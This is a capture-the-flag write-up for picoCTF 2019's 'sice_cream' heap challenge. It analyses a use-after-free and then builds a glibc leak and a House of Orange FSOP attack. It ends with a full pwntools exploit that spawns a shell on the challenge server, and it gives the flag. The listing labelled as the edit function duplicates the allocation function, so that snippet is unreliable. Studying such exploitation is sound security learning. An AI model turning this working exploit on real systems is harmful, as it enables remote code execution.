# picoCTF 2019 sice_cream Writeup

#### Description

Just pwn this [program](https://jupiter.challenges.picoctf.org/static/8715579c7b1c8027c5fcea197b7a8e09/sice_cream) and get a flag. Connect with `nc jupiter.challenges.picoctf.org 51860`. [libc.so.6](https://jupiter.challenges.picoctf.org/static/8715579c7b1c8027c5fcea197b7a8e09/libc.so.6) [ld-2.23.so](https://jupiter.challenges.picoctf.org/static/8715579c7b1c8027c5fcea197b7a8e09/ld-2.23.so).

<hr>

As always, download the binaries, run checksec and decompile the program using ghidra.
checksec output:
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./'
```
In ghidra we can locate main and the important functions:
1. main
```c
void FUN_00400b76(void) {
  int iVar1;
  ulong uVar2;
  long in_FS_OFFSET;
  char local_28 [24];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  puts("Welcome to the Sice Cream Store!");
  puts("We have the best sice cream in the world!");
  puts("Whats your name?");
  printf("> ");
  read(0,&DAT_00602040,0x100);
  while( true ) {
    while( true ) {
      while( true ) {
        FUN_004008e7();
        printf("> ");
        read(0,local_28,0x10);
        uVar2 = strtoul(local_28,(char **)0x0,10);
        iVar1 = (int)uVar2;
        if (iVar1 != 2) break;
        FUN_00400a5b();
      }
      if (2 < iVar1) break;
      if (iVar1 != 1) goto LAB_00400cb5;
      FUN_0040091e();
    }
    if (iVar1 != 3) break;
    FUN_00400b24();
  }
  if (iVar1 == 4) {
    puts("Too hard? ;)");
  }
LAB_00400cb5:
  exit(0);
}
```
2. a function that allocates chunks
```c
void FUN_0040091e(void) {
  int iVar1;
  ulong uVar2;
  void *pvVar3;
  long in_FS_OFFSET;
  char local_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  iVar1 = FUN_004008a7();
  if (iVar1 < 0) {
    puts("Out of space!");
    exit(-1);
  }
  puts("How much sice cream do you want?");
  printf("> ");
  read(0,local_28,0x10);
  uVar2 = strtoul(local_28,(char **)0x0,10);
  if (0x58 < (uint)uVar2) {
    puts("That\'s too much sice cream!");
    exit(-1);
  }
  pvVar3 = malloc(uVar2 & 0xffffffff);
  *(void **)(&DAT_00602140 + (long)iVar1 * 8) = pvVar3;
  puts("What flavor?");
  printf("> ");
  read(0,*(void **)(&DAT_00602140 + (long)iVar1 * 8),uVar2 & 0xffffffff);
  puts("Here you go!");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}

int FUN_004008a7(void) {
  int local_c;
  
  local_c = 0;
  while( true ) {
    if (0x13 < local_c) {
      return -1;
    }
    if (*(long *)(&DAT_00602140 + (long)local_c * 8) == 0) break;
    local_c = local_c + 1;
  }
  return local_c;
}
```
3. a function that frees chunks
```c
void FUN_00400a5b(void) {
  ulong uVar1;
  long in_FS_OFFSET;
  char local_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Which sice cream do you want to eat?");
  printf("> ");
  read(0,local_28,0x10);
  uVar1 = strtoul(local_28,(char **)0x0,10);
  if (0x13 < (uint)uVar1) {
    puts("Invalid index!");
    exit(-1);
  }
  free(*(void **)(&DAT_00602140 + (uVar1 & 0xffffffff) * 8));
  puts("Yum!");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```
4. a function that edits and dumps a global array
```c
void FUN_0040091e(void) {
  int iVar1;
  ulong uVar2;
  void *pvVar3;
  long in_FS_OFFSET;
  char local_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  iVar1 = FUN_004008a7();
  if (iVar1 < 0) {
    puts("Out of space!");
    exit(-1);
  }
  puts("How much sice cream do you want?");
  printf("> ");
  read(0,local_28,0x10);
  uVar2 = strtoul(local_28,(char **)0x0,10);
  if (0x58 < (uint)uVar2) {
    puts("That\'s too much sice cream!");
    exit(-1);
  }
  pvVar3 = malloc(uVar2 & 0xffffffff);
  *(void **)(&DAT_00602140 + (long)iVar1 * 8) = pvVar3;
  puts("What flavor?");
  printf("> ");
  read(0,*(void **)(&DAT_00602140 + (long)iVar1 * 8),uVar2 & 0xffffffff);
  puts("Here you go!");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```
This is an interesting variation of the classic heap challenge. Usually the is a way to allocate, free, edit chunks, and view. This binary gives a way to allocate, free, and edit and view a global array.

Looking at the allocation function, there are no obvious bugs. They restrict the total number of chunks allocated to 20, the chunk size to 88, and handle input correctly so there are no buffer overflows.

Looking at the free function they do not clear the pointers to the chunks they free, which means we can abuse use after free.

Looking at the edit function I realized that the array of malloced pointers is aligned to the end of the global array, meaning that if we fill the global array with non null characters, the first pointer can be leaked. This might be useful later.

Other than the UAF, and the heap leak there are no obvious bugs with negative indexing or bad number handling.

<hr>

**NOTE**
The following exploit is crafted for glibc 2.23 and will not work on newer versions, which introduce more security checks.

## Leaking glibc base address
First order of business is figuring out how to leak the glibc base address (the base address changes every time the binary is run due to ALSR). This is because knowing the glibc base gives us access to many exploitable components.

Usually to leak the glibc address I would allocate a chunk that is at least 144 bytes in size to bypass the fastbin, then free it and read the first 8 bytes to leak the glibc address. Doing that is not possible because the binary only allows us to allocate chunks up to 90 bytes. Even if I could allocate a chunk with size greater than 144 there is no way to view the chunk a leak the address.

### Committing heap fraud
If we can't create a chunk > 144 bytes legally, why don't we just create a fake one and free that instead?
The binary is loaded at a fixed address, and this means that the global array will always be located at the same place every time the program is run. This allows us to create a fake chunk inside the global array, and free that fake chunk to leak a glibc address.

```python
# create three chunks of the same size on the heap
create(0, b"")        # chunk 0
create(0, b"")        # chunk 1
create(0, b"")        # chunk 2

# create a fake chunk inside the global array with size 0x20
payload =  b""
payload += p64(0) + p64(0x21)
payload =  payload.ljust(0x100, b"\x00")
change(payload)

# free chunk 0 twice into the fastbin
delete(0)
delete(1)
delete(0)

# first allocation returns previous chunk 0 and overwrites the fd
# pointer with a pointer to the fake chunk
create(8, p64(0x602040)) # chunk 3
# second allocation returns chunk 1
create(0, b"")           # chunk 4
# third allocation returns chunk 0 again
create(0, b"")           # chunk 5
# fourth allocation finally returns our fake chunk at address 0x602040
create(0, b"")           # chunk 6

# now modify the metadata of the chunk and change its size to 0x90
payload =  b""
payload += p64(0) + p64(0x91)
payload += b"\x00" * 0x88
payload += p64(0x21)
payload += p64(0) * 3
payload += p64(0x21)
assert(len(payload) <= 256)
change(payload)

# fake chunk is now freed into the unsorted bin
delete(6)
```
The lower 16 bytes to the fake chunk will now contain two 8 byte pointers to the glibc.
Leaking those pointers is simple.
```python
# send 15 'A's and a newline
data = b"A" * 15
change(data)
io.recvuntil(b"A\n")
leak = io.recv(6)
leak = u64(leak + b"\x00\x00")
print(f"[+] leak: 0x{leak:x}")
base = leak - 0x3c4b78
print(f"[+] base: 0x{base:x}")
```
Now we have the glibc base, time to actually exploit this program.

## Pwn Time
The first thing I thought of was trying to do a tcache attack, until I remembered that this version of the glibc does not have a tcache.

After doing a bit of research I found an attack that works by overwriting `__malloc_hook` using the same fastbin trick to get a chunk that overlaps with that pointer and then overwriting it with a one gadget. But that attack requires being able to allocate chunks of size `0x70`, and we are capped at `0x58`.

There is another attack to overwriting the `_IO_read_end` field in the glibc stdin FILE structure, but that attack requires the program to use scanf so that will not work either.

Finally found an exploit called the [House of Orange](https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_orange.c) attack. This exploit takes advantage of a few things:
- unchecked write in `malloc`
- `malloc_printerr` calls `_IO_flush_all_lockp`, which allows for an FSOP attack

The attack performs the following steps:
- get a chunk with size 0x60 into the unsorted bin
- create a fake FILE structure in that same chunk
- overwrite the chunk's bk pointer to `_IO_list_all` - 0x10
- malloc a chunk of size smaller than 0x60
- pop a shell

```python
# calculate the address of _IO_list_all using the glibc leak
victim = base + 0x3c5520 - 0x10
print(f"[+] victim: 0x{victim:x}")

if args.SYSTEM:
    shell = base + 0x45390
else:
    shell = base + 0xf1147
print(f"[+] shell: 0x{shell:x}")

# setup the fake chunk
size = 0x60
payload =  b""
payload += b"/bin/sh\x00" + p64(size | 1)     # <- set the size to 0x61
payload += p64(leak) + p64(victim)            # <- set the bk pointer
payload += p64(0) + p64(1)                    # <- set to pass checks
payload =  list(payload.ljust(0x100, b"A"))   # <- pad to 256 bytes
payload[0xc0:0xc8] = p64(0)                   # <- set to pass checks
payload[0xd8:0xe0] = p64(0x602080)            # <- pointer to vtable
payload[0x58:0x60] = p64(shell)               # <- address of code to pop shell
payload = bytes(payload)
assert(len(payload) <= 256)
change(payload)

io.sendlineafter(delim, b"1")                 # allocate a chunk to
io.sendlineafter(delim, b"0")                 # trigger the exploit

io.interactive()
```

### House of Orange
When the final allocation occurs, `malloc` iterates over the chunks in the unsorted bin and attempts to find a chunk to return.
There will only be a single chunk in the unsorted bin, our fake chunk.
It writes the address of `unsorted_chunks(av)` into `bk->fd`, overwriting `_IO_list_all`. `malloc` then sorts the chunk into the fourth smallbin.
During the next iteration, `malloc` will detect irregularities and calls `malloc_printerr`, which calls `abort`, which calls `_IO_flush_all_lockp`.
Once inside `_IO_flush_all_lockp` it reads `_IO_list_all` to retrieve the address of the first FILE structure.
`_IO_flush_all_lockp` processes the first fake FILE structure but does not do anything, and moves on to the next FILE structure, which happens to be the fourth smallbin.
Thus it finally reads our crafted FILE structure and executes our one gadget, popping a shell.

## Full Exploit
```python
from pwn import *
import sys

if args.REMOTE:
    io = remote("jupiter.challenges.picoctf.org", 51860)
else:
    io = process("./sice_cream", stderr=sys.stdout)

delim = b"> "

def create(size, data):
    io.sendlineafter(delim, b"1")
    io.sendlineafter(delim, str(size).encode())
    if len(data) < size:
        data += b"\n"
    io.sendafter(delim, data)

def delete(index):
    io.sendlineafter(delim, b"2")
    io.sendlineafter(delim, str(index).encode())

def change(data):
    io.sendlineafter(delim, b"3")
    if len(data) < 0x100:
        data += b"\n"
    io.sendafter(delim, data)

io.sendline()

create(0, b"") # 0
create(0, b"") # 1
create(0, b"") # 2

payload =  b""
payload += p64(0) + p64(0x21)
payload =  payload.ljust(0x100, b"\x00")
change(payload)

delete(0)
delete(1)
delete(0)

create(8, p64(0x602040)) # 3
create(0, b"")           # 4
create(0, b"")           # 5
create(0, b"")           # 6

payload =  b""
payload += p64(0) + p64(0x91)
payload += b"\x00" * 0x88
payload += p64(0x21)
payload += p64(0) * 3
payload += p64(0x21)
assert(len(payload) <= 256)
change(payload)

delete(6)

data = b"A" * 15
change(data)
io.recvuntil(b"A\n")
leak = io.recv(6)
leak = u64(leak + b"\x00\x00")
print(f"[+] leak: 0x{leak:x}")
base = leak - 0x3c4b78
print(f"[+] base: 0x{base:x}")

victim = base + 0x3c5520 - 0x10
print(f"[+] victim: 0x{victim:x}")

if args.SYSTEM:
    shell = base + 0x45390
else:
    shell = base + 0xf1147
print(f"[+] shell: 0x{shell:x}")

size = 0x60
payload =  b""
payload += b"/bin/sh\x00" + p64(size | 1)
payload += p64(leak) + p64(victim)
payload += p64(0) + p64(1)
payload =  list(payload.ljust(0x100, b"A"))
payload[0xc0:0xc8] = p64(0)
payload[0xd8:0xe0] = p64(0x602080)
payload[0x58:0x60] = p64(shell)
payload = bytes(payload)
assert(len(payload) <= 256)
change(payload)

io.sendlineafter(delim, b"1")
io.sendlineafter(delim, b"0")

io.interactive()
```

## Flag
`flag{th3_r3al_questi0n_is_why_1s_libc_2.23_still_4_th1ng_f1e5910b}`
